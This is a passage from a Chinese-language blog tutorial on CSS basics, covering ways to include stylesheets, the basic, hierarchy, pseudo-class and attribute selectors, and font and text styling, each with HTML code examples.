class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>​    <strong>CSS的优势：</strong></p>
<ol>
<li>内容和表现分离</li>
<li>网页结构表现同意，可以实现复用</li>
<li>样式十分的丰富</li>
<li>建议使用独立于html的css文件</li>
<li>利用SEO，容易被搜索引擎收录</li>
</ol>
<h3 id="1-4-CSS的3种导入方式"><a href="#1-4-CSS的3种导入方式" class="headerlink" title="1.4 CSS的3种导入方式"></a>1.4 CSS的3种导入方式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--内部样式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        h1&#123;</span><br><span class="line">            color: green;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;demo02.css&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--优先级：就近原则--&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--行内样式：在标签元素种，编写一个style属性，编写样式即可--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color: red&quot;</span>&gt;</span>我是标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>扩展：外部样式两种写法</p>
<ul>
<li><p>链接式：</p>
<p>html</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--外部样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;demo02.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>导入式</p>
<p>@import是CSS2.1特有</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="keyword">@import</span> url(<span class="string">&quot;demo02.css&quot;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="2、选择器"><a href="#2、选择器" class="headerlink" title="2、选择器"></a>2、选择器</h2><p>作用：选择页面上的某一个或者某一类元素</p>
<h3 id="2-1-基本选择器"><a href="#2-1-基本选择器" class="headerlink" title="2.1 基本选择器"></a>2.1 基本选择器</h3><ol>
<li>标签选择器：选择一类标签        {}</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="comment">/*标签选择器，会选择到页面上所有的这个标签的元素*/</span></span></span><br><span class="line">        h1&#123;</span><br><span class="line"><span class="css">            <span class="selector-tag">color</span>: <span class="selector-id">#09eec5</span>;</span></span><br><span class="line">            background: burlywood;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">        &#125;</span><br><span class="line">        p&#123;</span><br><span class="line">            font-size: 80px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学CSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学CSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>类选择器 class：选择所有class属性一致的标签，跨标签    .类名{}    </li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        /*类选择器的格式 .class的名称&#123;&#125;</span><br><span class="line">        好处，可以多个标签归类，是同一个class，可以复用</span><br><span class="line"></span><br><span class="line">        */</span><br><span class="line"><span class="css">        <span class="selector-class">.qinjiang</span>&#123;</span></span><br><span class="line">            color: red;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.kuang</span>&#123;</span></span><br><span class="line">            color: darkorange;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;qinjiang&quot;</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;kuang&quot;</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;kuang&quot;</span>&gt;</span>标题3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;kuang&quot;</span>&gt;</span>P标签<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>id选择器：全局唯一！   #id名{}</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        /*</span><br><span class="line"><span class="css">        <span class="selector-tag">id</span>选择器   <span class="selector-pseudo">:id</span>不许保证全局唯一！</span></span><br><span class="line"><span class="css">        <span class="selector-id">#id</span>名称&#123;&#125;</span></span><br><span class="line">        优先级：</span><br><span class="line">        不遵循就近原则，固定的</span><br><span class="line">        id选择器 &gt; class 选择器 &gt; 标签选择器</span><br><span class="line">         */</span><br><span class="line"><span class="css">        <span class="selector-id">#i1</span>&#123;</span></span><br><span class="line">            color: plum;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.style1</span>&#123;</span></span><br><span class="line">            color: green;</span><br><span class="line">        &#125;</span><br><span class="line">        h1&#123;</span><br><span class="line">            color: red;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;i1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;style1&quot;</span>&gt;</span>标题1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;style1&quot;</span>&gt;</span>标题2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;style1&quot;</span>&gt;</span>标题3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题4<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题5<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>优先级</strong>：id选择器 &gt; class 选择器 &gt; 标签选择器</p>
<h3 id="2-2-层次选择器"><a href="#2-2-层次选择器" class="headerlink" title="2.2 层次选择器"></a>2.2 层次选择器</h3><ol>
<li>后代选择器：在某个元素的后面   </li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*后代选择器*/</span></span><br><span class="line"><span class="selector-tag">body</span> <span class="selector-tag">p</span>&#123;</span><br><span class="line">	<span class="attribute">background</span>: burlywood;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>子选择器：一代</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*子选择器*/</span></span><br><span class="line"><span class="selector-tag">body</span>&gt;<span class="selector-tag">p</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#09eec5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>相邻兄弟选择器：同辈</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*兄弟选择器*/</span></span><br><span class="line"><span class="selector-class">.active</span> +<span class="selector-tag">p</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: brown;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>通用选择器</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*通用兄弟选择器，当前选中元素的向下的所有兄弟元素*/</span></span><br><span class="line"><span class="selector-class">.active</span> ~<span class="selector-tag">p</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#07f637</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="2-3-结构伪类选择器"><a href="#2-3-结构伪类选择器" class="headerlink" title="2.3 结构伪类选择器"></a>2.3 结构伪类选择器</h3><p>伪类：条件</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*ul的第一个子元素*/</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-pseudo">:first-child</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: darkolivegreen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*ul的最后一个子元素*/</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-pseudo">:last-child</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: darkgray;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*选中p1：定位到父元素，选择当前的第一个元素</span></span><br><span class="line"><span class="comment">选择当前p元素的腹肌元素，选择父级元素的第一个，并且是当前元素才生效，顺序*/</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:nth-child(1)</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: lightsteelblue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*选择父元素，下的p元素的第二个，类型*/</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:nth-of-type(2)</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#b5deb0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210205121757757.png" alt="image-20210205121757757"></p>
<h3 id="2-4-属性选择器"><a href="#2-4-属性选择器" class="headerlink" title="2.4 属性选择器"></a>2.4 属性选择器</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.demo</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">            float: left;</span><br><span class="line">            display: block;</span><br><span class="line">            height: 50px;</span><br><span class="line">            width: 50px;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            background: lightsteelblue;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: gainsboro;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">            margin-right: 5px;</span><br><span class="line">            font: bold 20px/50px Arial;</span><br><span class="line">        &#125;</span><br><span class="line">        /*属性名，属性名 = 属性值（正则）</span><br><span class="line">        = 绝对等于</span><br><span class="line">        *= 包含这个元素</span><br><span class="line">        */</span><br><span class="line"><span class="css">        <span class="comment">/*存在id属性的元素     a[]&#123;&#125;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*a[id]&#123;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*    background: yellow;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*&#125;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*a[id=first]&#123;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*    background: yellow;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*&#125;*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="comment">/* class中又link的元素*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*a[class*=&quot;link&quot;]&#123;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*    background: #b5deb0;*/</span></span></span><br><span class="line"><span class="css">        <span class="comment">/*&#125;*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="comment">/*选中href中以http开头的元素*/</span></span></span><br><span class="line"><span class="css">        <span class="selector-tag">a</span><span class="selector-attr">[href^=http]</span>&#123;</span></span><br><span class="line">            background: darkolivegreen;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">        <span class="comment">/*选中href中以pdf结尾的元素*/</span></span></span><br><span class="line"><span class="css">        <span class="selector-tag">a</span><span class="selector-attr">[href$=pdf]</span>&#123;</span></span><br><span class="line">            background: darkolivegreen;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link item first&quot;</span> <span class="attr">id</span>=<span class="string">&quot;first&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link item active&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">title</span>=<span class="string">&quot;test&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;iamges/123.thml&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link item&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;iamges/123.png&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link item&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;iamges/123.jpg&quot;</span>&gt;</span>5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;abc&quot;</span>&gt;</span>6<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/a.pdf&quot;</span>&gt;</span>7<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/abc.pdf&quot;</span>&gt;</span>8<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;abc.doc&quot;</span>&gt;</span>9<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;abcd.doc&quot;</span> <span class="attr">class</span>=<span class="string">&quot;link item last&quot;</span>&gt;</span>10<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210205152949502.png" alt="image-20210205152949502"></p>
<h2 id="3、美化页面元素"><a href="#3、美化页面元素" class="headerlink" title="3、美化页面元素"></a>3、美化页面元素</h2><h3 id="3-1-为什么要梅花网页"><a href="#3-1-为什么要梅花网页" class="headerlink" title="3.1 为什么要梅花网页"></a>3.1 为什么要梅花网页</h3><ol>
<li>有效传递页面信息</li>
<li>美化网页，页面漂亮，才能吸引用户</li>
<li>凸显页面主题</li>
<li>提高用户体验</li>
</ol>
<p>span标签：重点要突出的字，使用span套起来</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-id">#title1</span>&#123;</span></span><br><span class="line">            font-size: 50px;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">欢迎学习<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;title1&quot;</span>&gt;</span>JAVA<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="3-2-字体样式"><a href="#3-2-字体样式" class="headerlink" title="3.2 字体样式"></a>3.2 字体样式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--字体风格--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        p&#123;</span><br><span class="line">            font: oblique bolder 22px &quot;楷体&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>雷军，男，汉族，1969年12月16日出生于湖北省仙桃市，无党派，大学学历，理学学士学位，高级工程师。 [1]  中国大陆著名天使投资人。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="3-3-文本样式"><a href="#3-3-文本样式" class="headerlink" title="3.3 文本样式"></a>3.3 文本样式</h3><ol>
<li>颜色 color    rgb    rgba</li>
<li><strong>文本对齐方式</strong>    text-align = center</li>
<li><strong>首行缩进</strong>    text-indent:2em</li>
<li><strong>行高</strong>    line-height:    单行文字上下居中  line-height = height</li>
<li>装饰    text-decoration</li>
<li>文本图片水平对齐    vertical-align: middle</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    颜色：</span></span><br><span class="line"><span class="comment">        单词</span></span><br><span class="line"><span class="comment">        RGB 0~F</span></span><br><span class="line"><span class="comment">        RBGA A:0~1</span></span><br><span class="line"><span class="comment">    text-align: 排版，居中</span></span><br><span class="line"><span class="comment">    text-indent: 2em;   段落首行缩进</span></span><br><span class="line"><span class="comment">    height: 300px;</span></span><br><span class="line"><span class="comment">    line-height: 300px;</span></span><br><span class="line"><span class="comment">    行高，和块的高度一致就可以上下居中</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        h1&#123;</span><br><span class="line">            color: rgba(0,255,255,0.5);</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.p1</span>&#123;</span></span><br><span class="line">            text-indent: 2em;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="selector-class">.p3</span>&#123;</span></span><br><span class="line">            background: lightsteelblue;</span><br><span class="line">            height: 300px;</span><br><span class="line">            line-height: 300px;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="comment">/*下划线*/</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.l1</span>&#123;</span></span><br><span class="line">            text-decoration: underline;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="comment">/*中划线*/</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.l2</span>&#123;</span></span><br><span class="line">            text-decoration: line-through;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="css">        <span class="comment">/*上划线*/</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.l3</span>&#123;</span></span><br><span class="line">            text-decoration: overline;</span><br><span class="line">        &#125;</span><br><span class="line">        /*</span><br><span class="line">        水平对齐~参照物，   a，b</span><br><span class="line">        */</span><br><span class="line">         img,span&#123;</span><br><span class="line">             vertical-align: middle;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">        <span class="comment">/*超链接去下划线*/</span></span></span><br><span class="line">        a&#123;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/img.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>asdasfagadfhs<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;l1&quot;</span>&gt;</span>123123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;l2&quot;</span>&gt;</span>123123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;l3&quot;</span>&gt;</span>123123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>介绍<span class="tag">&lt;/<span 